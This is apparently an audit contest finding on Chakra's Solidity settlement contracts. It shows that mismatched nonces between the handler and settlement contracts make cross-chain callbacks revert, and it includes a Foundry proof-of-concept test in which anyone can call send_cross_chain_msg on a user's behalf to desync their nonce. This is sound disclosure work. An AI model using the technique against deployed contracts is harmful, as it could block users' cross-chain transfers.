# Vulnerability details

## Impact
If user's nonce in handler contract and settlement contract is different, user's message txid is different in handler contract and settlement contract. when `receive_cross_chain_callback` is called, the txid is passed directly from settlement contract to handler contract in receive-callback context. So `receive_cross_chain_callback` in handler contract will revert.

## Proof of Concept
https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L139-L150
https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/ChakraSettlement.sol#L122-L133
There are four handler contracts and one settlement contract on one chain. A user can set cross-chain message by arbitrary handler contract depending on the mode.
The txid is calculated using follow ways:
handler contract →
```
        uint256 txid = uint256(
            keccak256(
                abi.encodePacked(
                    chain,
                    to_chain,
                    msg.sender, // from address for settlement to calculate txid
                    address(this), //  from handler for settlement to calculate txid
                    to_handler,
                    nonce_manager[msg.sender]
                )
            )
        );
```
settlement contract →
```
        uint256 txid = uint256(
            keccak256(
                abi.encodePacked(
                    contract_chain_name, // from chain
                    to_chain,
                    from_address, // msg.sender address
                    from_handler, // settlement handler address
                    to_handler,
                    nonce_manager[from_address]
                )
            )
        );
```
The method of calculation is the same in handler contract and settlement contract.
However we have four handler contracts and settlement contract.
Case 1:
1. A user alice sends cross-chain message A by handler_1 contract, the txid of A is same in handler and settlement contracts. nonce_manager[alice] in settlement contract will increment 1.
2. And then alice sends cross-chain message B by handler_2 contract, the txid of B is different in handler and settlement contracts because of different nonce.
3. Message B is received in another chain.
4. And then `receive_cross_chain_callback` function is called. It pass the txid in settlement contract to handler contract directly. And `receive_cross_chain_callback` function in handler contract has a check:
```
       require(create_cross_txs[txid].status == CrossChainTxStatus.Pending, "invalid CrossChainTxStatus");
``` 
5. The txid input of `receive_cross_chain_callback` function in handler contract  is from settlement contract. Two txids are different. So the input txid status is Unknown and not Pending. `receive_cross_chain_callback` function in handler contract will revert.

Case 2:
1. Attacker call `send_cross_chain_msg` directly in settlement contract with alice as from_address. And nonce_manager[alice] in settlement contract will increment according to the call times.
2. Alice send cross-chain message by handler contract. Nonce of alice is different in handler contract and settlement contract.
3. According to the analysis of case 1, `receive_cross_chain_callback` function in handler contract will revert.

pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {ChakraSettlement} from "../../contracts/ChakraSettlement.sol";
import {ChakraSettlementHandler} from "../../contracts/ChakraSettlementHandler.sol";
import {SettlementSignatureVerifier} from "../../contracts/SettlementSignatureVerifier.sol";
import {ERC20CodecV1} from "../../contracts/ERC20CodecV1.sol";
import {ChakraToken} from "../../contracts/ChakraToken.sol";
import {BaseSettlementHandler} from "../../contracts/BaseSettlementHandler.sol";
import {PayloadType, CrossChainMsgStatus} from "../../contracts/libraries/Message.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract CallbackFailed is Test {
    ChakraSettlementHandler handler_1;
    ChakraSettlementHandler handler_3;
    ChakraSettlement settlement;
    SettlementSignatureVerifier verifier;
    ERC20CodecV1 codec;
    ChakraToken token;

    BaseSettlementHandler.SettlementMode public mode_1;
    BaseSettlementHandler.SettlementMode public mode_3;
    CrossChainMsgStatus public status;

    address owner = makeAddr("owner");
    address manager = makeAddr("manager");
    address validator;
    uint256 validator_key;

    address user = makeAddr("user");

    function setUp() public {
        (validator, validator_key) = makeAddrAndKey("validator");
        // For the sake of simplicity, no proxy was used.
        vm.startPrank(owner);
        // deploy library contract: verifier, codec, token
        verifier = new SettlementSignatureVerifier();
        verifier.initialize(owner, 1);
        codec = new ERC20CodecV1();
        codec.initialize(owner);
        token = new ChakraToken();
        token.initialize(owner, manager, "ChakraToken", "ckrBTC", 8);
        // deploy settlement
        settlement = new ChakraSettlement();
        address[] memory managers = new address[](1);
        managers[0] = manager;
        settlement.initialize("eth", 1, owner, managers, 1, address(verifier));
        // deploy first handler: handler_1
        handler_1 = new ChakraSettlementHandler();
        mode_1 = BaseSettlementHandler.SettlementMode.LockMint;
        handler_1.initialize(
            owner, mode_1, "eth", address(token), address(codec), address(verifier), address(settlement)
        );
        // deploy second handler: handler_3
        handler_3 = new ChakraSettlementHandler();
        mode_3 = BaseSettlementHandler.SettlementMode.LockUnlock;
        handler_3.initialize(
            owner, mode_3, "eth", address(token), address(codec), address(verifier), address(settlement)
        );
        // verifier contract config
        verifier.add_manager(manager);
        vm.stopPrank();
        vm.startPrank(manager);
        verifier.add_validator(validator);
        vm.stopPrank();
        // handler contract config
        vm.startPrank(owner);
        handler_1.add_handler("arb", uint256(0x123));
        handler_3.add_handler("arb", uint256(0x123));
        vm.stopPrank();
    }

    function test_callbackFailed_case1() public {
        uint256 amount = 1e8;
        deal(address(token), user, amount * 2);
        vm.startPrank(user);
        token.approve(address(handler_1), amount);
        token.approve(address(handler_3), amount);
        string memory to_chain = "arb";
        uint256 to_handler = uint256(0x123);
        uint256 to_token = uint256(0x456);
        uint256 to = uint256(uint160(user));
        vm.recordLogs();
        // send first cross-chain message by handler_1: A
        handler_1.cross_chain_erc20_settlement(to_chain, to_handler, to_token, to, amount);
        // send second cross-chain message by handler_3: B
        handler_3.cross_chain_erc20_settlement(to_chain, to_handler, to_token, to, amount);
        vm.stopPrank();
        Vm.Log[] memory logs = vm.getRecordedLogs();
        assertEq(logs.length, 6);
        Vm.Log memory log_1 = logs[1];
        assertEq(log_1.topics[0], keccak256("CrossChainMsg(uint256,address,string,string,address,uint256,uint8,bytes)"));
        // message A settlement txid
        uint256 settlement_txid_message_A = uint256(log_1.topics[1]);
        Vm.Log memory log_2 = logs[2];
        assertEq(
            log_2.topics[0],
            keccak256("CrossChainLocked(uint256,address,uint256,string,string,address,uint256,uint256,uint8)")
        );
        // message A handler txid
        uint256 handler_txid_message_A = uint256(log_1.topics[1]);
        // message A handler txid == message A settlement txid
        assertEq(handler_txid_message_A, settlement_txid_message_A);
        Vm.Log memory log_4 = logs[4];
        assertEq(log_4.topics[0], keccak256("CrossChainMsg(uint256,address,string,string,address,uint256,uint8,bytes)"));
        // message B settlement txid
        uint256 settlement_txid_message_B = uint256(log_4.topics[1]);
        Vm.Log memory log_5 = logs[5];
        assertEq(
            log_5.topics[0],
            keccak256("CrossChainLocked(uint256,address,uint256,string,string,address,uint256,uint256,uint8)")
        );
        // message B handler txid
        uint256 handler_txid_message_B = uint256(log_5.topics[1]);
        // message B handler txid != message B settlement txid
        assertNotEq(handler_txid_message_B, settlement_txid_message_B);

        ////////////////////////////////////////////
        //// message B is received successfully ////
        ////////////////////////////////////////////

        // get signature
        vm.startPrank(validator);
        status = CrossChainMsgStatus.Success;
        bytes32 hash =
            keccak256(abi.encodePacked(settlement_txid_message_B, uint256(0x123), address(handler_3), status));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validator_key, hash);
        bytes memory signature = abi.encodePacked(r, s, v);
        vm.stopPrank();
        // message B callback
        vm.expectRevert("invalid CrossChainTxStatus");
        settlement.receive_cross_chain_callback(
            settlement_txid_message_B, "arb", uint256(0x123), address(handler_3), status, 0, signature
        );
    }

    function test_callbackFailed_case2() public {
        // anyone can call this function with user as from_address
        settlement.send_cross_chain_msg("", user, 0, PayloadType.ERC20, "");
        uint256 amount = 1e8;
        deal(address(token), user, amount);
        vm.startPrank(user);
        token.approve(address(handler_1), amount);
        string memory to_chain = "arb";
        uint256 to_handler = uint256(0x123);
        uint256 to_token = uint256(0x456);
        uint256 to = uint256(uint160(user));
        vm.recordLogs();
        // send cross-chain message
        handler_1.cross_chain_erc20_settlement(to_chain, to_handler, to_token, to, amount);
        vm.stopPrank();
        Vm.Log[] memory logs = vm.getRecordedLogs();
        assertEq(logs.length, 3);
        Vm.Log memory log_1 = logs[1];
        assertEq(log_1.topics[0], keccak256("CrossChainMsg(uint256,address,string,string,address,uint256,uint8,bytes)"));
        // message settlement txid
        uint256 settlement_txid_message = uint256(log_1.topics[1]);
        Vm.Log memory log_2 = logs[2];
        assertEq(
            log_2.topics[0],
            keccak256("CrossChainLocked(uint256,address,uint256,string,string,address,uint256,uint256,uint8)")
        );
        // message handler txid
        uint256 handler_txid_message = uint256(log_2.topics[1]);
        // message handler txid != message settlement txid
        assertNotEq(handler_txid_message, settlement_txid_message);

        ////////////////////////////////////////////
        ///// message is received successfully /////
        ////////////////////////////////////////////

        // get signature
        vm.startPrank(validator);
        status = CrossChainMsgStatus.Success;
        bytes32 hash = keccak256(abi.encodePacked(settlement_txid_message, uint256(0x123), address(handler_1), status));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validator_key, hash);
        bytes memory signature = abi.encodePacked(r, s, v);
        vm.stopPrank();
        // message callback
        vm.expectRevert("invalid CrossChainTxStatus");
        settlement.receive_cross_chain_callback(
            settlement_txid_message, "arb", uint256(0x123), address(handler_1), status, 0, signature
        );
    }
}

## Recommended Mitigation Steps
Pass the txid in handler contract directly to settlement contract. Keep txid same in handler contract and settlement contract. The txid's calculation includes mode number.
